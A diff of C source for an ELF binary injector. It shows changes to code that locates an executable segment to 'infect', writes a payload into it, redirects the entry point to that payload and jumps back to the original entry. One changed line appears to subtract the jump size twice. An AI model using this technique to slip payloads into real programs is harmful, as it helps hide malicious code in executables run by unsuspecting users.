@@ -2,10 +2,10 @@
 
 
  /* ELF header
-                    mm              (char *)    : memory map with mmap
-          header        (Elf64_Ehdr)        : Elf header, contains info about binary
-                    pheader     (Elf64_Phdr)        : Array of programs
-          prog_size (size_t)                : Payload size
+          mm          (char *)     :  memory map with mmap
+          header      (Elf64_Ehdr) :  Elf header, contains info about binary
+          pheader     (Elf64_Phdr) :  Array of programs
+          prog_size   (size_t)     :  Payload size
  */
 
 int read_elf(const char *mm, Elf64_Ehdr *header, Elf64_Phdr *pheader, size_t prog_size){
@@ -40,9 +40,9 @@ int read_elf(const char *mm, Elf64_Ehdr *header, Elf64_Phdr *pheader, size_t pro
         if (pheader[i].p_filesz == 0 || !(pheader[i].p_flags & PF_X) || pheader[i].p_filesz != pheader[i].p_memsz) continue;
 
         uint64_t segment_end = pheader[i].p_offset + pheader[i].p_filesz;
-        fprintf(stderr, "\nFOUND VALID PROGRAM HEADER TO INFECT, at %lu, p%d\n", segment_end, i+1);
 
         if (verbose) {
+            fprintf(stderr, "\nFOUND VALID PROGRAM HEADER TO INFECT, at %lu, p%d\n", segment_end, i+1);
             fprintf(stderr, "\tElf program header mem size:             0x%lx\n", pheader[i].p_memsz);
             fprintf(stderr, "\tElf program file size:                   0x%lx\n", pheader[i].p_filesz);
             fprintf(stderr, "\tElf program header byte offset:          0x%lx\n", pheader[i].p_offset);
@@ -85,7 +85,7 @@ void write_injection(char *target, Elf64_Ehdr *header, Elf64_Phdr *phdr, const c
     off_t jmp_offset = header->e_entry - (inj_vaddr + payload_len + JMP_INSTRUCTION_SIZE);
 
     if (jmp_offset > 0x7FFFFFFFL || jmp_offset < -0x80000000L)
-        f_error("JMP", "Relative jmp > 2gb, unable to perform jump");
+        f_error("JMP", "Relative jmp instruction > 2gb, unable to perform jump");
 
     if (verbose) {
         fprintf(stderr, "Injection position:          0x%lx\n", inj_offset);
@@ -96,7 +96,7 @@ void write_injection(char *target, Elf64_Ehdr *header, Elf64_Phdr *phdr, const c
 
     // Generating machine relative return 'jmp' insert
     char jump_back[5] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };
-    *(Elf64_Word*) (jump_back + 1) = (Elf64_Word) jmp_offset;
+    *(Elf64_Word*) (jump_back + 1) = (Elf64_Word) jmp_offset - 5;
 
     // setting entry point to the injection
     header->e_entry = inj_vaddr;
@@ -115,21 +115,16 @@ void write_injection(char *target, Elf64_Ehdr *header, Elf64_Phdr *phdr, const c
 
 
 int main(int argc, char **argv) {
-    printf("ELF Injector Initiated\n\n");
+    printf("ELF Injection Initiated\n\n");
 
-    if(argc < 3)
-        f_error("PROGRAM INPUT", "Not enough arguments.");
-
-    int i = 1;
-    if (argc > 3 && strcmp(argv[i], "-v") == 0) {
-        verbose = 1;
-        i = 2;
-    }
+		char *tar_path;
+		char *pay_path;
+		parse_args(argc, argv, &tar_path, &pay_path);
 
     char *target;
     size_t target_size;
-    if (verbose) fprintf(stderr, "Opening target ELF, \"%s\"\n", argv[i]);
-    switch (file_memmap(&target, argv[i], &target_size, PROT_READ | PROT_WRITE)){
+    if (verbose) fprintf(stderr, "Opening target ELF, \"%s\"\n", tar_path);
+    switch (file_memmap(&target, tar_path, &target_size, PROT_READ | PROT_WRITE)){
         case -1: f_error("TARGET ELF FILE", "Target ELF file failed to open");
         case -2: f_error("TARGET ELF FILE", "Target ELF stat failed to retrieve");
         case -3: f_error("TARGET ELF FILE", "Target ELF failed to mmap");
@@ -137,8 +132,8 @@ int main(int argc, char **argv) {
 
     char *payload;
     size_t payload_size;
-    if (verbose) fprintf(stderr, "Opening payload binary, \"%s\"\n", argv[i + 1]);
-    switch (file_memmap(&payload, argv[i + 1], &payload_size, PROT_READ)){
+    if (verbose) fprintf(stderr, "Opening payload binary, \"%s\"\n", pay_path);
+    switch (file_memmap(&payload, pay_path, &payload_size, PROT_READ)){
         case -1: f_error("PAYLOAD", "PAYLOAD failed to open");
         case -2: f_error("PAYLOAD", "PAYLOAD stat failed to retrieve");
         case -3: f_error("PAYLOAD", "PAYLOAD failed to mmap");
@@ -157,5 +152,6 @@ int main(int argc, char **argv) {
 
     mmclean(target, target_size);
     mmclean(payload, payload_size);
+    printf("ELF Injection Success!\n\n");
     return 0;
 }
